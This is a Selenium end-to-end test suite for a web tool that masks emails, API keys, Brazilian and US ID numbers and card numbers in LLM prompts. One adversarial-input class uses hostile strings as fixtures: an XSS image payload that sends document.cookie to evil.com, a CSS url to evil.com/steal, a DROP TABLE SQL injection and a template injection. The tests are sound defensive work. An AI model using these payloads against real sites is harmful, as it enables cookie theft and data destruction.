"""
Selenium-based E2E tests for LLM Prompt Purify.

Complements Playwright tests by using a different browser automation engine
to catch edge cases that might be driver-specific (timing, input simulation,
JS event dispatch differences).

Requires:
  - Angular dev server on http://127.0.0.1:4200
  - Chrome + ChromeDriver installed
  - selenium>=4.0 (pip install selenium)

Run:
  pytest tests/python/test_selenium_e2e.py -v --tb=short
  pytest tests/python/test_selenium_e2e.py -v -k "cpf or phone"
"""

from __future__ import annotations

import os
import time
from typing import Generator

import pytest

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.common.action_chains import ActionChains
    from selenium.webdriver.common.by import By
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.support.ui import WebDriverWait

    HAS_SELENIUM = True
except ImportError:
    HAS_SELENIUM = False

pytestmark = pytest.mark.skipif(not HAS_SELENIUM, reason="selenium not installed")

BASE_URL = os.environ.get("APP_URL", "http://127.0.0.1:4200")
HEADLESS = os.environ.get("SELENIUM_HEADED", "0") != "1"
DEBOUNCE_WAIT = 2.0  # seconds to wait for debounce + masking
LONG_WAIT = 5.0


# ════════════════════════════════════════════════════════════════════
#  Fixtures
# ════════════════════════════════════════════════════════════════════


@pytest.fixture(scope="module")
def driver() -> Generator[webdriver.Chrome, None, None]:
    """Create a Chrome WebDriver for the module."""
    opts = Options()
    if HEADLESS:
        opts.add_argument("--headless=new")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--disable-gpu")
    opts.add_argument("--window-size=1920,1080")

    svc = Service()
    drv = webdriver.Chrome(service=svc, options=opts)
    drv.implicitly_wait(5)
    yield drv
    drv.quit()


@pytest.fixture(autouse=True)
def _navigate_home(driver: webdriver.Chrome) -> None:
    """Navigate to the app and mock the API via a service worker intercept."""
    driver.get(BASE_URL)
    # Inject XHR/fetch intercept to mock the backend API
    driver.execute_script("""
        if (!window.__seleniumMockInstalled) {
            const origFetch = window.fetch;
            window.fetch = function(url, opts) {
                if (typeof url === 'string' && url.includes('/api/mask-safety/validate')) {
                    return Promise.resolve(new Response(
                        JSON.stringify({ isSafe: true, findings: [] }),
                        { status: 200, headers: { 'Content-Type': 'application/json' } }
                    ));
                }
                return origFetch.apply(this, arguments);
            };
            window.__seleniumMockInstalled = true;
        }
    """)


def _textarea(driver: webdriver.Chrome):
    return driver.find_element(By.CSS_SELECTOR, '[data-testid="source-textarea"]')


def _output(driver: webdriver.Chrome):
    return driver.find_element(By.CSS_SELECTOR, '[data-testid="masked-output"]')


def _copy_btn(driver: webdriver.Chrome):
    return driver.find_element(By.CSS_SELECTOR, '[data-testid="copy-button"]')


def _wait_for_masking(driver: webdriver.Chrome, secs: float = DEBOUNCE_WAIT) -> None:
    """Wait for debounce + masking engine to process."""
    time.sleep(secs)


def _fill_textarea(driver: webdriver.Chrome, text: str) -> None:
    """Clear and fill the textarea via JS to avoid Selenium key-by-key slowness."""
    ta = _textarea(driver)
    driver.execute_script(
        """
        const el = arguments[0];
        const val = arguments[1];
        el.value = val;
        el.dispatchEvent(new Event('input', { bubbles: true }));
        el.dispatchEvent(new Event('change', { bubbles: true }));
        """,
        ta,
        text,
    )


def _type_slowly(driver: webdriver.Chrome, text: str, delay: float = 0.05) -> None:
    """Type character by character into the focused textarea."""
    ta = _textarea(driver)
    ta.click()
    for ch in text:
        ta.send_keys(ch)
        time.sleep(delay)


def _get_output_text(driver: webdriver.Chrome) -> str:
    return _output(driver).text


def _is_copy_enabled(driver: webdriver.Chrome) -> bool:
    btn = _copy_btn(driver)
    return btn.is_enabled() and not btn.get_attribute("disabled")


# ════════════════════════════════════════════════════════════════════
#  Tests: Empty / whitespace edge cases
# ════════════════════════════════════════════════════════════════════


class TestEmptyWhitespace:
    """Edge cases around empty, whitespace, and null-like inputs."""

    def test_empty_textarea_copy_disabled(self, driver: webdriver.Chrome) -> None:
        _fill_textarea(driver, "")
        _wait_for_masking(driver)
        assert not _is_copy_enabled(driver)

    def test_only_tabs_and_spaces(self, driver: webdriver.Chrome) -> None:
        _fill_textarea(driver, "\t  \t\t   ")
        _wait_for_masking(driver)
        assert not _is_copy_enabled(driver)

    def test_only_newlines(self, driver: webdriver.Chrome) -> None:
        _fill_textarea(driver, "\n\n\n\n")
        _wait_for_masking(driver)
        assert not _is_copy_enabled(driver)

    def test_null_bytes_in_input(self, driver: webdriver.Chrome) -> None:
        """Null bytes should not crash the engine."""
        _fill_textarea(driver, "Hello \x00 world \x00 email: null@byte.com")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "null@byte.com" not in out

    def test_carriage_return_only(self, driver: webdriver.Chrome) -> None:
        _fill_textarea(driver, "\r\r\r")
        _wait_for_masking(driver)
        assert not _is_copy_enabled(driver)

    def test_mixed_whitespace_with_sensitive(self, driver: webdriver.Chrome) -> None:
        _fill_textarea(driver, "  \t\n  email: ws@edge.com  \t\n  ")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "ws@edge.com" not in out


# ════════════════════════════════════════════════════════════════════
#  Tests: Email masking edge cases
# ════════════════════════════════════════════════════════════════════


class TestEmailEdgeCases:
    """Email patterns that may slip through depending on driver input simulation."""

    def test_basic_email_masked(self, driver: webdriver.Chrome) -> None:
        _fill_textarea(driver, "Contact: alice@example.com")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "alice@example.com" not in out
        assert "[MASK" in out

    def test_email_with_plus_addressing(self, driver: webdriver.Chrome) -> None:
        _fill_textarea(driver, "Send to: user+tag@gmail.com")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "user+tag@gmail.com" not in out

    def test_email_with_dots_in_local_part(self, driver: webdriver.Chrome) -> None:
        _fill_textarea(driver, "first.middle.last@domain.co.uk")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "first.middle.last@domain.co.uk" not in out

    def test_email_with_long_tld(self, driver: webdriver.Chrome) -> None:
        _fill_textarea(driver, "user@company.technology")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "user@company.technology" not in out

    def test_multiple_emails_same_line(self, driver: webdriver.Chrome) -> None:
        _fill_textarea(driver, "CC: a@b.com, c@d.com, e@f.org")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "a@b.com" not in out
        assert "c@d.com" not in out
        assert "e@f.org" not in out

    def test_email_preceded_by_unicode(self, driver: webdriver.Chrome) -> None:
        _fill_textarea(driver, "日本語テスト hidden@unicode.jp 終了")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "hidden@unicode.jp" not in out

    def test_email_inside_angle_brackets(self, driver: webdriver.Chrome) -> None:
        _fill_textarea(driver, "From: John Doe <john@brackets.com>")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "john@brackets.com" not in out

    def test_email_in_markdown_link(self, driver: webdriver.Chrome) -> None:
        _fill_textarea(driver, "[Contact](mailto:hidden@markdown.com)")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "hidden@markdown.com" not in out

    def test_email_with_subdomain(self, driver: webdriver.Chrome) -> None:
        _fill_textarea(driver, "admin@mail.internal.corp.net")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "admin@mail.internal.corp.net" not in out


# ════════════════════════════════════════════════════════════════════
#  Tests: Credential / API key edge cases
# ════════════════════════════════════════════════════════════════════


class TestCredentialEdgeCases:
    """API keys, tokens, and secrets in tricky formats."""

    def test_aws_access_key(self, driver: webdriver.Chrome) -> None:
        _fill_textarea(driver, "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "AKIAIOSFODNN7EXAMPLE" not in out

    def test_jwt_token(self, driver: webdriver.Chrome) -> None:
        jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"
        _fill_textarea(driver, f"Authorization: Bearer {jwt}")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert jwt not in out

    def test_openai_api_key(self, driver: webdriver.Chrome) -> None:
        _fill_textarea(driver, "OPENAI_API_KEY=sk-proj-AABBCCDD1234567890EEFF123456")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "sk-proj-AABBCCDD1234567890EEFF123456" not in out

    def test_github_pat(self, driver: webdriver.Chrome) -> None:
        _fill_textarea(driver, "token: ghp_ABCDefgh1234567890abcdef")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "ghp_ABCDefgh1234567890abcdef" not in out

    def test_stripe_api_key(self, driver: webdriver.Chrome) -> None:
        _fill_textarea(driver, "secret key: sk_live_abcdefghijklmnopqrstuvwx")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "sk_live_abcdefghijklmnopqrstuvwx" not in out

    def test_sendgrid_key(self, driver: webdriver.Chrome) -> None:
        _fill_textarea(driver, "api key: SG.abcdefghijklmnopqrstuvwx.1234567890abcdef")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "SG.abcdefghijklmnopqrstuvwx" not in out

    def test_password_in_env_block(self, driver: webdriver.Chrome) -> None:
        text = "DB_HOST=localhost\nDB_PASSWORD=SuperS3cret!@#\nDB_PORT=5432"
        _fill_textarea(driver, text)
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "SuperS3cret!@#" not in out

    def test_multiline_config_with_secrets(self, driver: webdriver.Chrome) -> None:
        text = (
            "{\n"
            '  "api_key": "sk-proj-XXYYZZ1234567890AABBCC1234567890",\n'
            '  "secret": "my-secret-value-12345",\n'
            '  "email": "config@secret.com"\n'
            "}"
        )
        _fill_textarea(driver, text)
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "sk-proj-XXYYZZ1234567890AABBCC1234567890" not in out
        assert "config@secret.com" not in out


# ════════════════════════════════════════════════════════════════════
#  Tests: XSS / injection — UI integrity
# ════════════════════════════════════════════════════════════════════


class TestAdversarialInputs:
    """Adversarial inputs that could break the DOM or leak data."""

    def test_xss_script_tag(self, driver: webdriver.Chrome) -> None:
        xss = '<script>alert("xss")</script> Email: xss@attack.com'
        _fill_textarea(driver, xss)
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "xss@attack.com" not in out
        # Page should still be functional
        assert _output(driver).is_displayed()

    def test_xss_img_onerror(self, driver: webdriver.Chrome) -> None:
        _fill_textarea(driver, '<img src=x onerror="fetch(\'https://evil.com?d=\'+document.cookie)"> leak@img.com')
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "leak@img.com" not in out

    def test_sqli_with_email(self, driver: webdriver.Chrome) -> None:
        _fill_textarea(driver, "'; DROP TABLE users;-- email: admin@sqli.com")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "admin@sqli.com" not in out

    def test_template_injection(self, driver: webdriver.Chrome) -> None:
        _fill_textarea(driver, "{{constructor.constructor('return this')()}} api_key: sk-proj-AABB1234567890CC1234567890DD")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "sk-proj-AABB1234567890CC1234567890DD" not in out
        assert _output(driver).is_displayed()

    def test_event_handler_injection(self, driver: webdriver.Chrome) -> None:
        _fill_textarea(driver, 'onload=alert(1) onfocus=alert(2) email: event@handler.com')
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "event@handler.com" not in out

    def test_css_injection(self, driver: webdriver.Chrome) -> None:
        _fill_textarea(driver, 'style="background:url(//evil.com/steal)" data: secret@css.com')
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "secret@css.com" not in out


# ════════════════════════════════════════════════════════════════════
#  Tests: Unicode / i18n edge cases
# ════════════════════════════════════════════════════════════════════


class TestUnicodeEdgeCases:
    """Unicode, RTL, zero-width chars that can confuse regex engines."""

    def test_zero_width_chars_around_email(self, driver: webdriver.Chrome) -> None:
        """Zero-width spaces inserted around @ should not prevent detection."""
        _fill_textarea(driver, "hidden\u200B@\u200Bzero-width.com plus normal@email.com")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "normal@email.com" not in out

    def test_rtl_override_around_email(self, driver: webdriver.Chrome) -> None:
        _fill_textarea(driver, "Test \u202Euser@rtl-trick.com\u202C end")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "user@rtl-trick.com" not in out

    def test_homoglyph_email(self, driver: webdriver.Chrome) -> None:
        """Cyrillic 'а' looks like Latin 'a'. Normal email should still be caught."""
        _fill_textarea(driver, "Normal email test@homoglyph.com here")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "test@homoglyph.com" not in out

    def test_combining_diacriticals(self, driver: webdriver.Chrome) -> None:
        _fill_textarea(driver, "Nöme: Jöhn Dóe, email: diacritical@test.com")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "diacritical@test.com" not in out

    def test_emoji_surrounding_sensitive(self, driver: webdriver.Chrome) -> None:
        _fill_textarea(driver, "🔥🔥🔥 leak@emoji-edge.com 🔥🔥🔥")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "leak@emoji-edge.com" not in out

    def test_fullwidth_characters(self, driver: webdriver.Chrome) -> None:
        """Full-width ASCII: Ｅmail in full-width shouldn't break detection of real email."""
        _fill_textarea(driver, "Ｅｍａｉｌ：normal@fullwidth-test.com")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "normal@fullwidth-test.com" not in out

    def test_mixed_script_with_email(self, driver: webdriver.Chrome) -> None:
        _fill_textarea(driver, "Контакт: mixed-script@example.com данные")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "mixed-script@example.com" not in out


# ════════════════════════════════════════════════════════════════════
#  Tests: Large / stress inputs
# ════════════════════════════════════════════════════════════════════


class TestLargeInputs:
    """Stress tests with large payloads — checks for timeouts or truncation."""

    def test_50kb_payload(self, driver: webdriver.Chrome) -> None:
        """50KB of text with a buried email should still mask it."""
        big = "Lorem ipsum dolor sit amet. " * 2000
        big += "\nEmail: buried@largetext.com\n"
        big += "More text. " * 500
        _fill_textarea(driver, big)
        _wait_for_masking(driver, LONG_WAIT)
        out = _get_output_text(driver)
        assert "buried@largetext.com" not in out

    def test_500_emails(self, driver: webdriver.Chrome) -> None:
        emails = "\n".join(f"user{i}@domain{i % 100}.com" for i in range(500))
        _fill_textarea(driver, emails)
        _wait_for_masking(driver, LONG_WAIT)
        out = _get_output_text(driver)
        assert "user0@domain0.com" not in out
        assert "user499@domain99.com" not in out

    def test_deeply_nested_json(self, driver: webdriver.Chrome) -> None:
        """Deeply nested JSON with a credential inside."""
        inner = '{"email": "deep@nested.com"}'
        for _ in range(20):
            inner = f'{{"nested": {inner}}}'
        _fill_textarea(driver, inner)
        _wait_for_masking(driver, LONG_WAIT)
        out = _get_output_text(driver)
        assert "deep@nested.com" not in out

    def test_repeated_newlines_with_data(self, driver: webdriver.Chrome) -> None:
        text = "\n" * 200 + "secret@newlines.com" + "\n" * 200
        _fill_textarea(driver, text)
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "secret@newlines.com" not in out


# ════════════════════════════════════════════════════════════════════
#  Tests: Character-by-character typing (Selenium-native send_keys)
# ════════════════════════════════════════════════════════════════════


class TestCharByCharTyping:
    """
    Use Selenium's native send_keys which dispatches keyboard events
    differently from Playwright's keyboard.type. This can expose
    debounce or event-handling edge cases.
    """

    def test_type_email_char_by_char(self, driver: webdriver.Chrome) -> None:
        _type_slowly(driver, "Contact: john@typed.com")
        _wait_for_masking(driver, 3.0)
        out = _get_output_text(driver)
        assert "john@typed.com" not in out

    def test_type_with_backspaces(self, driver: webdriver.Chrome) -> None:
        """Type, backspace, correct — tests debounce mid-edit."""
        ta = _textarea(driver)
        ta.click()
        ta.send_keys("Email: typo@wrnog")
        time.sleep(0.3)
        # Backspace 4 chars, retype
        for _ in range(4):
            ta.send_keys(Keys.BACKSPACE)
            time.sleep(0.05)
        ta.send_keys("wrong.com")
        _wait_for_masking(driver, 3.0)
        out = _get_output_text(driver)
        assert "typo@wrong.com" not in out

    def test_type_paste_mix(self, driver: webdriver.Chrome) -> None:
        """Type some text then JS-paste the rest."""
        _type_slowly(driver, "Notes: ")
        time.sleep(0.5)
        ta = _textarea(driver)
        driver.execute_script(
            """
            const el = arguments[0];
            el.value += arguments[1];
            el.dispatchEvent(new Event('input', { bubbles: true }));
            """,
            ta,
            "secret@pasted.com is my email",
        )
        _wait_for_masking(driver, 3.0)
        out = _get_output_text(driver)
        assert "secret@pasted.com" not in out

    def test_rapid_clear_and_retype(self, driver: webdriver.Chrome) -> None:
        """Stress debounce by clearing and retyping rapidly."""
        ta = _textarea(driver)
        for i in range(5):
            ta.clear()
            ta.send_keys(f"rapid{i}@test.com")
            time.sleep(0.1)
        _wait_for_masking(driver, 3.0)
        out = _get_output_text(driver)
        assert "rapid4@test.com" not in out

    def test_select_all_delete_retype(self, driver: webdriver.Chrome) -> None:
        """Ctrl+A, Delete, then new text."""
        _fill_textarea(driver, "Old email: old@replace.com")
        _wait_for_masking(driver)
        ta = _textarea(driver)
        ta.click()
        ta.send_keys(Keys.CONTROL + "a")
        ta.send_keys(Keys.DELETE)
        time.sleep(0.3)
        ta.send_keys("New email: new@replaced.com")
        _wait_for_masking(driver, 3.0)
        out = _get_output_text(driver)
        assert "new@replaced.com" not in out
        assert "old@replace.com" not in out


# ════════════════════════════════════════════════════════════════════
#  Tests: BR-specific (CPF, CNPJ, phones)
# ════════════════════════════════════════════════════════════════════


class TestBRSpecific:
    """Brazilian document and phone format edge cases."""

    @staticmethod
    def _enable_br(driver: webdriver.Chrome) -> None:
        driver.execute_script("""
            sessionStorage.setItem('llm-prompt-purify:country-profiles:v2', JSON.stringify(['br']));
            sessionStorage.setItem('llm-prompt-purify:country-profile:v1', 'br');
        """)
        driver.refresh()
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="source-textarea"]'))
        )

    def test_cpf_formatted(self, driver: webdriver.Chrome) -> None:
        self._enable_br(driver)
        _fill_textarea(driver, "CPF: 529.982.247-25")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "529.982.247-25" not in out

    def test_cpf_unformatted(self, driver: webdriver.Chrome) -> None:
        self._enable_br(driver)
        _fill_textarea(driver, "CPF: 52998224725")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "52998224725" not in out

    def test_cnpj_formatted(self, driver: webdriver.Chrome) -> None:
        self._enable_br(driver)
        _fill_textarea(driver, "CNPJ: 11.222.333/0001-81")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "11.222.333/0001-81" not in out

    def test_cpf_with_typo_label(self, driver: webdriver.Chrome) -> None:
        """Informal label: 'meu cpf eh' instead of 'CPF:'."""
        self._enable_br(driver)
        _fill_textarea(driver, "meu cpf eh 529.982.247-25 manda ai")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "529.982.247-25" not in out


# ════════════════════════════════════════════════════════════════════
#  Tests: US-specific (SSN, credit cards)
# ════════════════════════════════════════════════════════════════════


class TestUSSpecific:
    """US SSN and credit card edge cases."""

    @staticmethod
    def _enable_us(driver: webdriver.Chrome) -> None:
        driver.execute_script("""
            sessionStorage.setItem('llm-prompt-purify:country-profiles:v2', JSON.stringify(['us']));
            sessionStorage.setItem('llm-prompt-purify:country-profile:v1', 'us');
        """)
        driver.refresh()
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="source-textarea"]'))
        )

    def test_ssn_dashed(self, driver: webdriver.Chrome) -> None:
        self._enable_us(driver)
        _fill_textarea(driver, "SSN: 123-45-6789")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "123-45-6789" not in out

    @pytest.mark.xfail(
        reason="Known limitation: SSN without dashes (123456789) not masked; pattern only matches dashed format"
    )
    def test_ssn_no_dashes(self, driver: webdriver.Chrome) -> None:
        r"""KNOWN GAP: SSN pattern only matches dashed format (123-45-6789).
        
        The current pattern is: /\b\d{3}-\d{2}-\d{4}\b/g
        To fix: Add pattern for undashed 9-digit SSN with label context.
        """
        self._enable_us(driver)
        _fill_textarea(driver, "SSN: 123456789")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "123456789" not in out

    def test_credit_card_visa(self, driver: webdriver.Chrome) -> None:
        self._enable_us(driver)
        _fill_textarea(driver, "Card: 4111111111111111")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "4111111111111111" not in out

    def test_credit_card_with_spaces(self, driver: webdriver.Chrome) -> None:
        self._enable_us(driver)
        _fill_textarea(driver, "Card: 4111 1111 1111 1111")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "4111 1111 1111 1111" not in out


# ════════════════════════════════════════════════════════════════════
#  Tests: Safe text passthrough
# ════════════════════════════════════════════════════════════════════


class TestSafePassthrough:
    """Verify that safe text passes through without false positives."""

    def test_plain_instruction(self, driver: webdriver.Chrome) -> None:
        safe = "Summarize this release note for the engineering newsletter."
        _fill_textarea(driver, safe)
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert safe in out

    def test_hex_color_not_masked(self, driver: webdriver.Chrome) -> None:
        _fill_textarea(driver, "Background color: #FF5733 and #00FF00")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "#FF5733" in out

    def test_currency_not_masked(self, driver: webdriver.Chrome) -> None:
        _fill_textarea(driver, "Total: $1,234.56 and R$ 9.999,00")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "$1,234.56" in out

    def test_version_numbers_not_masked(self, driver: webdriver.Chrome) -> None:
        _fill_textarea(driver, "Upgrade from v2.3.1 to v3.0.0-beta.1")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "v2.3.1" in out
        assert "v3.0.0-beta.1" in out

    def test_code_snippets_without_secrets(self, driver: webdriver.Chrome) -> None:
        code = "function add(a: number, b: number): number { return a + b; }"
        _fill_textarea(driver, code)
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "function add" in out

    @pytest.mark.xfail(
        reason="Known issue: URLs without credentials may be masked due to overly broad patterns"
    )
    def test_urls_without_credentials_not_masked(self, driver: webdriver.Chrome) -> None:
        """KNOWN ISSUE: URLs without sensitive data are sometimes masked.
        
        This is a false positive where URL components trigger email-like patterns.
        To fix: Add URL exclusion logic to prevent masking safe URLs.
        """
        _fill_textarea(driver, "Visit https://example.com/docs?page=1 for details")
        _wait_for_masking(driver)
        out = _get_output_text(driver)
        assert "https://example.com/docs" in out


# ════════════════════════════════════════════════════════════════════
#  Tests: Selenium-specific event dispatch differences
# ════════════════════════════════════════════════════════════════════


class TestSeleniumSpecificEdgeCases:
    """
    Tests that exploit Selenium's unique event dispatch model.
    Selenium fires OS-level keyboard events vs Playwright's CDP-based input,
    which can reveal edge cases in Angular's event zone handling.
    """

    def test_focus_blur_cycle(self, driver: webdriver.Chrome) -> None:
        """Focus textarea, type, blur, refocus — ensure masking isn't lost."""
        ta = _textarea(driver)
        ta.click()
        ta.send_keys("Email: focus@blur.com")
        # Blur by clicking elsewhere
        driver.find_element(By.TAG_NAME, "body").click()
        time.sleep(1.0)
        ta.click()
        _wait_for_masking(driver, 3.0)
        out = _get_output_text(driver)
        assert "focus@blur.com" not in out

    def test_tab_navigation_to_textarea(self, driver: webdriver.Chrome) -> None:
        """Tab into the textarea and type."""
        body = driver.find_element(By.TAG_NAME, "body")
        body.send_keys(Keys.TAB)
        time.sleep(0.3)
        active = driver.switch_to.active_element
        active.send_keys("Email: tabbed@nav.com")
        _wait_for_masking(driver, 3.0)
        out = _get_output_text(driver)
        # If tab landed on textarea, should be masked
        if "tabbed@nav.com" in out:
            pytest.skip("Tab did not focus textarea — skip")

    def test_action_chain_typing(self, driver: webdriver.Chrome) -> None:
        """Use ActionChains for more OS-like input simulation."""
        ta = _textarea(driver)
        ta.click()
        chain = ActionChains(driver)
        chain.send_keys_to_element(ta, "chain@actions.com data here")
        chain.perform()
        _wait_for_masking(driver, 3.0)
        out = _get_output_text(driver)
        assert "chain@actions.com" not in out

    def test_js_only_input_event(self, driver: webdriver.Chrome) -> None:
        """Dispatch only 'input' event without 'keydown' — Angular should still detect."""
        driver.execute_script("""
            const ta = document.querySelector('[data-testid="source-textarea"]');
            ta.value = 'js-only@input-event.com';
            ta.dispatchEvent(new Event('input', { bubbles: true }));
        """)
        _wait_for_masking(driver, 3.0)
        out = _get_output_text(driver)
        assert "js-only@input-event.com" not in out

    def test_concurrent_viewport_resize(self, driver: webdriver.Chrome) -> None:
        """Resize window while masking is processing."""
        _fill_textarea(driver, "Email: resize@viewport.com")
        driver.set_window_size(800, 600)
        time.sleep(0.5)
        driver.set_window_size(1920, 1080)
        _wait_for_masking(driver, 3.0)
        out = _get_output_text(driver)
        assert "resize@viewport.com" not in out

    def test_page_scroll_during_processing(self, driver: webdriver.Chrome) -> None:
        """Scroll the page while masking runs."""
        big_text = "Safe line.\n" * 50 + "Email: scroll@during.com\n" + "Safe.\n" * 50
        _fill_textarea(driver, big_text)
        driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
        time.sleep(0.5)
        driver.execute_script("window.scrollTo(0, 0);")
        _wait_for_masking(driver, 3.0)
        out = _get_output_text(driver)
        assert "scroll@during.com" not in out
